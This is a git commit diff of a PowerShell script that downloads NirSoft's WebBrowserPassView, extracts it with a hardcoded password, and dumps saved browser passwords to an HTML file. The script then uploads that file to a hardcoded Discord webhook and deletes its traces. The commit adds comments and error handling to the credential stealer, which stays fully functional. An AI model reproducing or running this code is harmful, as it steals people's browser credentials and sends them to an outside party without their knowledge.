fbaf4241343a936c0f7eedbe610d054413b8b5df
2jeg <nick.kaza1337@gmail.com>
2025-02-03 00:39:44 +1100

    Update 2partcodeexec (1).ps1

--- 2partcodeexec (1).ps1
+++ 2partcodeexec (1).ps1
@@ -1,28 +1,34 @@
 $tmpfolder = "C:\temp"
 
+# Ensure the temporary folder is clean
 if (Test-Path $tmpfolder) { 
-    Remove-Item $tmpfolder -Recurse -Force 
+    Remove-Item $tmpfolder -Recurse -Force -ErrorAction SilentlyContinue 
 }
 
-mkdir $tmpfolder
+# Create a new temporary folder
+New-Item -ItemType Directory -Path $tmpfolder | Out-Null
 Set-Location $tmpfolder
 
 Start-Sleep -Seconds 3
 
+# Define URLs and file paths
 $wbpvUrl = 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip'
 $wbpvZip = 'wbpv.zip'
 $sevenZipUrl = 'https://www.7-zip.org/a/7za920.zip'
 $sevenZipZip = '7z.zip'
 $extractionPassword = 'wbpv28821@'
-$webhookUrl = 'https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX'
-$filePath = 'C:\temp\export.htm'
+$filePath = Join-Path -Path $tmpfolder -ChildPath 'export.htm'
 
+# Set referer header for web requests
 $refererHeader = @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'}
+
+# Download required files
 Invoke-WebRequest -Headers $refererHeader -Uri $wbpvUrl -OutFile $wbpvZip
 Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipZip
 
 Start-Sleep -Seconds 5
 
+# Extract the 7-Zip archive
 Expand-Archive -Path $sevenZipZip -DestinationPath '7z'
 
 $sevenZipPath = '.\7z\7za.exe'
@@ -54,11 +60,17 @@ Start-Sleep -Seconds 1
 
 Start-Sleep -Seconds 3
 
-$file = Get-Item $filePath
-$webhookUrl = "https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX"
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Form @{ file1 = $file }
+# Check if the file exists before attempting to get it
+if (Test-Path $filePath) {
+    $file = Get-Item $filePath
+    $webhookUrl = "https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX"
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Form @{ file1 = $file }
+} else {
+    Write-Host "File not found: $filePath"
+}
 
-Remove-Item -Recurse -Force 'C:\temp\*'
+# Clean up temporary files
+Remove-Item -Recurse -Force -Path 'C:\temp\*' -ErrorAction SilentlyContinue
 TASKKILL /IM "7z.exe" -ErrorAction SilentlyContinue
 TASKKILL /IM "7za.exe" -ErrorAction SilentlyContinue
 TASKKILL /IM "powershell.exe" -ErrorAction SilentlyContinue
